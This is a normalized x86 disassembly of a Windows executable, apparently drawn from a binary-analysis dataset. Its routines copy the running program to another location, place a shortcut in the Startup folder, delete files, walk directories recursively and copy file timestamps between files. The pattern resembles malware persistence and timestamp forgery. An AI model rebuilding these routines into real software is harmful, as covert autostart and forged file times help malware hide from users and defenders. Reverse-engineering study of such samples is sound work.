mov [ esp + 0x1f0 ] rw-data
mov [ esp + 0x1f4 ] cx
mov [ esp + 0x1f6 ] ax
mov [ esp + 0x1f8 ] rw-data
mov [ esp + 0x1fc ] bp
mov [ esp + 0x1fe ] ax
mov [ esp + 0x200 ] rw-data
mov [ esp + 0x204 ] dx
mov [ esp + 0x206 ] ax
mov [ esp + 0x208 ] rw-data
mov [ esp + 0x20c ] di
mov [ esp + 0x20e ] ax
mov [ esp + 0x210 ] rw-data
mov [ esp + 0x214 ] si
mov [ esp + 0x216 ] ax
mov [ esp + 0x218 ] rw-data
mov [ esp + 0x21c ] 0x37
mov [ esp + 0x21e ] bx
mov [ esp + 0x220 ] rw-data
mov [ esp + 0x224 ] 0x7
mov [ esp + 0x226 ] si
mov [ esp + 0x228 ] rw-data
mov [ esp + 0x22c ] bx
mov [ esp + 0x22e ] ax
mov [ esp + 0x230 ] rw-data
mov [ esp + 0x234 ] cx
mov [ esp + 0x236 ] ax
mov [ esp + 0x238 ] rw-data
mov [ esp + 0x23c ] bp
mov [ esp + 0x23e ] ax
mov [ esp + 0x240 ] rw-data
mov [ esp + 0x244 ] dx
mov [ esp + 0x246 ] ax
mov [ esp + 0x248 ] rw-data
mov [ esp + 0x24c ] di
mov [ esp + 0x24e ] ax
mov [ esp + 0x250 ] rw-data
mov [ esp + 0x254 ] 0x8
mov [ esp + 0x256 ] bx
mov [ esp + 0x258 ] rw-data
mov [ esp + 0x25c ] 0x47
mov [ esp + 0x25e ] bx
mov [ esp + 0x260 ] rw-data
mov [ esp + 0x264 ] 0xd
mov [ esp + 0x266 ] bx
mov [ esp + 0x268 ] rw-data
mov [ esp + 0x26c ] 0x39
mov [ esp + 0x26e ] bx
mov [ esp + 0x270 ] rw-data
mov [ esp + 0x274 ] 0xe
mov [ esp + 0x276 ] bx
mov [ esp + 0x278 ] rw-data
mov [ esp + 0x27c ] 0xf
mov [ esp + 0x27e ] bx
mov [ esp + 0x280 ] rw-data
mov [ esp + 0x284 ] 0x21
mov [ esp + 0x286 ] bx
mov [ esp + 0x288 ] rw-data
mov [ esp + 0x28c ] 0x10
mov [ esp + 0x28e ] bp
mov [ esp + 0x290 ] rw-data
mov [ esp + 0x294 ] bx
mov [ esp + 0x296 ] ax
mov [ esp + 0x298 ] rw-data
mov [ esp + 0x29c ] cx
mov [ esp + 0x29e ] ax
mov [ esp + 0x2a0 ] rw-data
mov [ esp + 0x2a4 ] 0x11
mov [ esp + 0x2a6 ] bx
mov [ esp + 0x2a8 ] rw-data
mov [ esp + 0x2ac ] 0x4b
mov [ esp + 0x2ae ] bx
mov [ esp + 0x2b0 ] rw-data
mov [ esp + 0x2b4 ] 0x57
mov [ esp + 0x2b6 ] bx
mov [ esp + 0x2b8 ] rw-data
mov [ esp + 0x2bc ] 0x12
mov [ esp + 0x2be ] cx
mov [ esp + 0x2c0 ] rw-data
mov [ esp + 0x2c4 ] bx
mov [ esp + 0x2c6 ] ax
mov [ esp + 0x2c8 ] rw-data
mov [ esp + 0x2cc ] 0x60
mov [ esp + 0x2ce ] bp
mov [ esp + 0x2d0 ] rw-data
mov [ esp + 0x2d4 ] bx
mov [ esp + 0x2d6 ] ax
mov [ esp + 0x2d8 ] rw-data
mov [ esp + 0x2dc ] cx
mov [ esp + 0x2de ] ax
mov [ esp + 0x2e0 ] rw-data
mov [ esp + 0x2e4 ] 0x3f
mov [ esp + 0x2e6 ] bx
mov [ esp + 0x2e8 ] rw-data
mov [ esp + 0x2ec ] 0x26
mov [ esp + 0x2ee ] bx
mov [ esp + 0x2f0 ] rw-data
mov [ esp + 0x2f4 ] 0x27
mov [ esp + 0x2f6 ] bp
mov [ esp + 0x2f8 ] rw-data
mov [ esp + 0x2fc ] bx
mov [ esp + 0x2fe ] ax
mov [ esp + 0x300 ] rw-data
mov [ esp + 0x304 ] cx
mov [ esp + 0x306 ] ax
mov [ esp + 0x308 ] rw-data
mov [ esp + 0x30c ] 0x2f
mov [ esp + 0x30e ] bx
mov [ esp + 0x310 ] rw-data
mov [ esp + 0x314 ] 0x3e
mov [ esp + 0x316 ] bp
mov [ esp + 0x318 ] rw-data
mov [ esp + 0x31c ] bx
mov [ esp + 0x31e ] ax
mov [ esp + 0x320 ] rw-data
mov [ esp + 0x324 ] cx
mov [ esp + 0x326 ] ax
mov [ esp + 0x328 ] rw-data
mov [ esp + 0x32c ] 0x4c
mov [ esp + 0x32e ] bx
mov [ esp + 0x330 ] rw-data
mov [ esp + 0x334 ] 0x58
mov [ esp + 0x336 ] bx
mov [ esp + 0x338 ] rw-data
mov [ esp + 0x33c ] 0x4e
mov [ esp + 0x33e ] bx
mov [ esp + 0x340 ] rw-data
mov [ esp + 0x344 ] 0x61
mov [ esp + 0x346 ] bp
mov [ esp + 0x348 ] rw-data
mov [ esp + 0x34c ] bx
mov [ esp + 0x34e ] ax
mov [ esp + 0x350 ] rw-data
mov [ esp + 0x354 ] cx
mov [ esp + 0x356 ] ax
mov [ esp + 0x358 ] rw-data
mov [ esp + 0x35c ] ax
mov [ esp + 0x35e ] dx
mov [ esp + 0x360 ] rw-data
mov [ esp + 0x364 ] ax
mov [ esp + 0x366 ] ax
mov [ esp + 0x368 ] rw-data
mov [ esp + 0x36c ] bx
mov [ esp + 0x36e ] ax
mov [ esp + 0x370 ] rw-data
mov [ esp + 0x374 ] cx
mov [ esp + 0x376 ] ax
mov [ esp + 0x378 ] rw-data
mov [ esp + 0x37c ] 0x14
mov [ esp + 0x37e ] bp
mov [ esp + 0x380 ] rw-data
mov [ esp + 0x384 ] bx
mov [ esp + 0x386 ] ax
mov [ esp + 0x388 ] rw-data
mov [ esp + 0x38c ] cx
mov [ esp + 0x38e ] ax
mov [ esp + 0x390 ] rw-data
mov [ esp + 0x394 ] 0x48
mov [ esp + 0x396 ] bx
mov [ esp + 0x398 ] rw-data
mov [ esp + 0x39c ] 0x15
mov [ esp + 0x39e ] bx
mov [ esp + 0x3a0 ] rw-data
mov [ esp + 0x3a4 ] 0x16
mov [ esp + 0x3a6 ] bp
mov [ esp + 0x3a8 ] rw-data
mov [ esp + 0x3ac ] bx
mov [ esp + 0x3ae ] ax
mov [ esp + 0x3b0 ] rw-data
mov [ esp + 0x3b4 ] cx
mov [ esp + 0x3b6 ] ax
mov [ esp + 0x3b8 ] rw-data
mov [ esp + 0x3bc ] 0x46
mov [ esp + 0x3be ] bx
mov [ esp + 0x3c0 ] rw-data
mov [ esp + 0x3c4 ] 0x18
mov [ esp + 0x3c6 ] bx
mov [ esp + 0x3c8 ] rw-data
mov [ esp + 0x3cc ] 0x19
mov [ esp + 0x3ce ] bx
mov [ esp + 0x3d0 ] rw-data
mov [ esp + 0x3d4 ] 0x4f
mov [ esp + 0x3d6 ] bx
mov [ esp + 0x3d8 ] rw-data
mov [ esp + 0x3dc ] 0x1a
mov [ esp + 0x3de ] dx
mov [ esp + 0x3e0 ] rw-data
mov [ esp + 0x3e4 ] bx
mov [ esp + 0x3e6 ] ax
mov [ esp + 0x3e8 ] rw-data
mov [ esp + 0x3ec ] cx
mov [ esp + 0x3ee ] ax
mov [ esp + 0x3f0 ] rw-data
mov [ esp + 0x3f4 ] bp
mov [ esp + 0x3f6 ] ax
mov [ esp + 0x3f8 ] rw-data
mov [ esp + 0x3fc ] 0x59
mov [ esp + 0x3fe ] bx
mov [ esp + 0x400 ] rw-data
mov [ esp + 0x404 ] 0x1b
mov [ esp + 0x406 ] bx
mov [ esp + 0x408 ] rw-data
mov [ esp + 0x40c ] 0x24
mov [ esp + 0x40e ] bx
mov [ esp + 0x410 ] rw-data
mov [ esp + 0x414 ] 0xa
mov [ esp + 0x416 ] 0x15
mov [ esp + 0x418 ] rw-data
mov [ esp + 0x41c ] bx
mov [ esp + 0x41e ] ax
mov [ esp + 0x420 ] rw-data
mov [ esp + 0x424 ] cx
mov [ esp + 0x426 ] ax
mov [ esp + 0x428 ] rw-data
mov [ esp + 0x42c ] bp
mov [ esp + 0x42e ] ax
mov [ esp + 0x430 ] rw-data
mov [ esp + 0x434 ] dx
mov [ esp + 0x436 ] ax
mov [ esp + 0x438 ] rw-data
mov [ esp + 0x43c ] di
mov [ esp + 0x43e ] ax
mov [ esp + 0x440 ] rw-data
mov [ esp + 0x444 ] si
mov [ esp + 0x446 ] ax
mov [ esp + 0x448 ] rw-data
mov [ esp + 0x44c ] 0x7
mov [ esp + 0x44e ] ax
mov [ esp + 0x450 ] rw-data
mov [ esp + 0x454 ] 0x8
mov [ esp + 0x456 ] ax
mov [ esp + 0x458 ] rw-data
mov [ esp + 0x45c ] 0x9
mov [ esp + 0x45e ] ax
mov [ esp + 0x460 ] rw-data
mov [ esp + 0x464 ] 0xa
mov [ esp + 0x466 ] ax
mov [ esp + 0x468 ] rw-data
mov [ esp + 0x46c ] 0xb
mov [ esp + 0x46e ] ax
mov [ esp + 0x470 ] rw-data
mov [ esp + 0x474 ] 0xc
mov [ esp + 0x476 ] ax
mov [ esp + 0x478 ] rw-data
mov [ esp + 0x47c ] 0xd
mov [ esp + 0x47e ] ax
mov [ esp + 0x480 ] rw-data
mov [ esp + 0x484 ] 0xe
mov [ esp + 0x486 ] ax
mov [ esp + 0x488 ] rw-data
mov [ esp + 0x48c ] 0xf
mov [ esp + 0x48e ] ax
mov [ esp + 0x490 ] rw-data
mov [ esp + 0x494 ] 0x10
mov [ esp + 0x496 ] ax
mov [ esp + 0x498 ] rw-data
mov [ esp + 0x49c ] 0x11
mov [ esp + 0x49e ] ax
mov [ esp + 0x4a0 ] rw-data
mov [ esp + 0x4a4 ] 0x12
mov [ esp + 0x4a6 ] ax
mov [ esp + 0x4a8 ] rw-data
mov [ esp + 0x4ac ] 0x13
mov [ esp + 0x4ae ] ax
mov [ esp + 0x4b0 ] rw-data
mov [ esp + 0x4b4 ] 0x14
mov [ esp + 0x4b6 ] ax
mov [ esp + 0x4b8 ] rw-data
mov [ esp + 0x4bc ] 0x41
mov [ esp + 0x4be ] bx
mov [ esp + 0x4c0 ] rw-data
mov [ esp + 0x4c4 ] 0x1d
mov [ esp + 0x4c6 ] bp
mov [ esp + 0x4c8 ] rw-data
mov [ esp + 0x4cc ] bx
mov [ esp + 0x4ce ] ax
mov [ esp + 0x4d0 ] rw-data
mov [ esp + 0x4d4 ] cx
mov [ esp + 0x4d6 ] ax
mov [ esp + 0x4d8 ] rw-data
mov [ esp + 0x4dc ] 0x49
mov [ esp + 0x4de ] bx
mov [ esp + 0x4e0 ] rw-data
mov [ esp + 0x4e4 ] 0x44
mov [ esp + 0x4e6 ] bx
mov [ esp + 0x4e8 ] rw-data
mov [ esp + 0x4ec ] 0x4a
mov [ esp + 0x4ee ] bx
mov [ esp + 0x4f0 ] rw-data
mov [ esp + 0x4f4 ] 0x1e
mov [ esp + 0x4f6 ] bx
mov [ esp + 0x4f8 ] rw-data
mov [ esp + 0x4fc ] 0x1f
mov [ esp + 0x4fe ] bx
mov [ esp + 0x500 ] rw-data
mov [ esp + 0x504 ] 0x22
xor esi esi
mov [ esp + 0x506 ] bx
mov [ esp + 0x508 ] rw-data
mov [ esp + 0x50c ] 0x20
mov [ esp + 0x50e ] bp
mov [ esp + 0x510 ] rw-data
mov [ esp + 0x514 ] bx
mov [ esp + 0x516 ] ax
mov [ esp + 0x518 ] rw-data
mov [ esp + 0x51c ] cx
mov [ esp + 0x51e ] ax
mov [ esp + 0x520 ] rw-data
mov [ esp + 0x524 ] 0x43
mov [ esp + 0x526 ] bp
mov [ esp + 0x528 ] rw-data
mov [ esp + 0x52c ] bx
mov [ esp + 0x52e ] ax
mov [ esp + 0x530 ] rw-data
mov [ esp + 0x534 ] cx
mov [ esp + 0x536 ] ax
mov [ esp + 0x538 ] rw-data
mov [ esp + 0x53c ] 0x2a
mov [ esp + 0x53e ] bx
mov [ esp + 0x540 ] rw-data
mov [ esp + 0x10 ] esi
call [ GetSystemDefaultLangID@IAT ]
mov cl al
and ecx 0xff
shr ax 0xa
mov edx eax
mov edi [ esp + esi * 8 + 0x18 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x548 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx ebp
cmp [ esp + eax * 8 + 0x16 ] bx
[ edi ] [ esi ]
je r-xdata
xor eax eax
mov ax [ esp + esi * 8 + 0x16 ]
add esi eax
cmp esi 0xa6
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x534
retn
and edx 0xffff
or ecx 0xffffffff
add edx eax
xor eax eax
mov edi [ esp + edx * 8 + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x548 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx ebp
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x534
retn
cmp [ esp + esi * 8 + 0x14 ] cx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x548 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx ebp
[ edi ] [ esi ]
sub_405900
mov eax [ rw-data ]
sub esp 0x358
test eax eax
push esi
jne r-xdata
push rw-data
lea eax [ esp + 0x160 ]
push rw-data
push eax
call sub_40c272
add esp 0xc
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x15c ]
push ecx
push edx
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop esi
add esp 0x358
retn
mov eax 0x1
pop esi
add esp 0x358
retn
lea eax [ esp + 0xc ]
push eax
call [ GetSystemTime@IAT ]
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push ecx
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
add eax 0xd71bc000
lea ecx [ esp + 0x30 ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x4 ]
adc edx 0xfffffa7f
push eax
push ecx
mov [ esp + 0x10 ] edx
call [ CompareFileTime@IAT ]
test eax eax
push esi
jle r-xdata
call [ FindClose@IAT ]
call [ FindClose@IAT ]
xor eax eax
pop esi
add esp 0x358
retn
sub_4059c0
sub esp 0x10c
lea eax [ esp ]
push esi
push edi
push eax
call [ SHGetMalloc@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop edi
pop esi
add esp 0x10c
retn
mov edx [ esp + 0x120 ]
lea ecx [ esp + 0xc ]
push ecx
push edx
push 0x0
call [ SHGetSpecialFolderLocation@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push eax
push ecx
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x10 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x11c ]
not ecx
cmp eax ecx
jae r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x118 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x10c
retn
pop edi
lea eax [ edx + 0x1 ]
pop esi
add esp 0x10c
retn
sub_405aa0
sub esp 0x18
mov eax [ esp + 0x1c ]
push esi
mov esi [ CreateFileA@IAT ]
push edi
push 0x0
push 0x2000000
push 0x3
push 0x0
push 0x5
push 0x80000000
push eax
call esi
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
add esp 0x18
retn
mov ecx [ esp + 0x28 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x40000000
push ecx
call esi
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push edi
call [ GetFileTime@IAT ]
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push esi
call [ SetFileTime@IAT ]
push edi
mov edi [ CloseHandle@IAT ]
call edi
push esi
call edi
push edi
call [ CloseHandle@IAT ]
pop edi
pop esi
add esp 0x18
retn
sub_405b40
sub esp 0x640
lea eax [ esp ]
push esi
push edi
push 0x0
push 0x5
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x640
retn
lea ecx [ esp + 0x8 ]
push 0x5c
push ecx
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
push 0x5c
push edx
lea edi [ eax + 0x1 ]
mov [ eax ] 0x0
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
mov [ eax ] 0x0
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x24c ]
push rw-data
push ecx
call sub_40c272
add esp 0xc
lea edx [ esp + 0x108 ]
lea eax [ esp + 0x248 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebp
mov ebp [ FindNextFileA@IAT ]
push esi
call [ FindClose@IAT ]
pop ebp
cmp [ esp + 0x138 ] 0x2e
je r-xdata
lea ecx [ esp + 0x10c ]
push ecx
push esi
call ebp
test eax eax
je r-xdata
test [ esp + 0x10c ] 0x10
je r-xdata
lea edx [ esp + 0x138 ]
push edi
lea eax [ esp + 0x10 ]
push edx
push eax
lea ecx [ esp + 0x458 ]
push rw-data
push ecx
call sub_40c272
lea edx [ esp + 0x460 ]
push edx
call sub_405d40
add esp 0x18
jmp r-xdata
sub_405c40
sub esp 0x640
lea eax [ esp ]
push esi
push edi
push 0x0
push 0x0
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x640
retn
lea ecx [ esp + 0x8 ]
push 0x5c
push ecx
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
push 0x5c
push edx
lea edi [ eax + 0x1 ]
mov [ eax ] 0x0
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
mov [ eax ] 0x0
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x24c ]
push rw-data
push ecx
call sub_40c272
add esp 0xc
lea edx [ esp + 0x108 ]
lea eax [ esp + 0x248 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebp
mov ebp [ FindNextFileA@IAT ]
push esi
call [ FindClose@IAT ]
pop ebp
cmp [ esp + 0x138 ] 0x2e
je r-xdata
lea ecx [ esp + 0x10c ]
push ecx
push esi
call ebp
test eax eax
je r-xdata
test [ esp + 0x10c ] 0x10
je r-xdata
lea edx [ esp + 0x138 ]
push edi
lea eax [ esp + 0x10 ]
push edx
push eax
lea ecx [ esp + 0x458 ]
push rw-data
push ecx
call sub_40c272
lea edx [ esp + 0x460 ]
push edx
call sub_405d40
add esp 0x18
jmp r-xdata
sub_405d40
sub esp 0x540
lea eax [ esp + 0x340 ]
push ebp
push esi
push edi
mov edi [ esp + 0x550 ]
push edi
push rw-data
push eax
call sub_40c272
add esp 0xc
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x34c ]
push ecx
push edx
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x540
retn
mov ebp [ FindNextFileA@IAT ]
push esi
call [ FindClose@IAT ]
cmp [ esp + 0x38 ] 0x2e
je r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
call ebp
test eax eax
je r-xdata
lea ecx [ esp + 0x38 ]
lea edx [ esp + 0x14c ]
push ecx
push edi
push rw-data
push edx
call sub_40c272
mov al [ esp + 0x1c ]
add esp 0x10
test al 0x10
je r-xdata
lea ecx [ esp + 0x38 ]
push ecx
call sub_402500
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x14c ]
push eax
call sub_405d40
add esp 0x4
test eax eax
je r-xdata
lea edx [ esp + 0x14c ]
push edx
call sub_402a60
add esp 0x4
jmp r-xdata
push esi
call [ FindClose@IAT ]
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x540
retn
jmp r-xdata
sub_405e30
sub esp 0x104
lea eax [ esp ]
push 0x0
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
add esp 0x104
retn
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xc ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x114 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebx
sub_405ec0
sub esp 0x314
lea eax [ esp + 0x8 ]
push 0x0
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
add esp 0x314
retn
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi [ esp + 0x328 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_413146
add esp 0x8
test eax eax
pop edi
pop esi
pop ebx
jne r-xdata
push 0x0
call [ CoInitialize@IAT ]
lea ecx [ esp ]
push ecx
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
mov eax [ esp + 0x324 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov ecx [ esp + 0x320 ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x50 ]
mov eax [ esp ]
mov ecx [ esp + 0x31c ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ esp ]
lea ecx [ esp + 0x4 ]
push ecx
push r--data
mov edx [ eax ]
push eax
call [ edx ]
test eax eax
jl r-xdata
mov eax [ esp ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
lea edx [ esp + 0x10c ]
push 0x104
push edx
lea eax [ esp + 0x10 ]
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x4 ]
lea edx [ esp + 0x10c ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ esp + 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_406020
sub esp 0x104
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push esi
push edi
mov edi [ esp + 0x110 ]
push 0x5c
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
push ecx
call sub_40c650
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x104
retn
mov edi [ CreateDirectoryA@IAT ]
inc eax
lea edx [ esp + 0x8 ]
push 0x0
push edx
call edi
test esi esi
je r-xdata
mov [ esi ] 0x0
mov [ esi ] 0x5c
lea eax [ esi + 0x1 ]
jmp r-xdata
push 0x5c
push eax
call sub_40c650
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sub_4060a0
sub esp 0x30c
mov eax rw-data
push ebx
push esi
push edi
mov esi rw-data
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea eax [ esp + 0x214 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
lea ecx [ esp + 0x114 ]
push 0x5
push ecx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
push rw-data
call sub_405e30
add esp 0x4
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x30c
retn
lea edi [ esp + 0x110 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov ebx [ esp + 0x320 ]
mov eax ecx
mov esi edi
mov edi edx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea edx [ esp + 0x114 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x320 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
push rw-data
push edx
call sub_40c272
add esp 0x14
lea eax [ esp + 0x214 ]
lea ecx [ esp + 0x110 ]
push eax
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push ebp
lea eax [ esp + 0x114 ]
push 0x1
push eax
push rw-data
push rw-data
call sub_405ec0
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x20 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x20 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_406020
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x220 ]
push ecx
call [ CopyFileA@IAT ]
pop ebp
lea edx [ esp + 0x110 ]
push eax
push edx
push rw-data
push rw-data
call sub_405ec0
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x30c
retn
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_4062c0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x3c ] eax
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x2c ]
cmp eax [ edx ]
je r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
push 0x38
push rw-data
mov ecx [ ebp + 0x18 ]
push ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_4063b0
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0xfffffffb
jmp r-xdata
push 0x4
lea eax [ ebp - 0x3c ]
push eax
call sub_406a4e
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_406ee5
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x3c ]
push ecx
call sub_406ee5
add esp 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x40 ] 0xfffffffb
jmp r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
